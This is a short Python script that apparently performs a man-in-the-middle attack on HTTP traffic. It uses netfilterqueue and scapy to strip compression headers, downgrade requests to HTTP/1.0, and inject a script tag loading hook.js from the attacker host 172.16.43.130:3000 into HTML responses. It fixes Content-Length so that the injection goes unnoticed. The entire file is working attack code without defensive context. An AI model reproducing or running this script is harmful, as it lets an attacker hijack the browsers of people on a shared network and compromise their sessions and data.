#!/usr/bin/env python
import argparse
import netfilterqueue
import re
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 8080:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapy_packet[scapy.TCP].sport == 8080:
                print("[+] Response")
                injection_code = '<script src="http://172.16.43.130:3000/hook.js"></script>'
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and ("text/html" in load):
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            load = load.encode()
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError as e:
            pass
    packet.accept()


parser = argparse.ArgumentParser()
parser.add_argument("-d", "--debug", dest="debug", help="Debug", default=False)
options = parser.parse_args()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
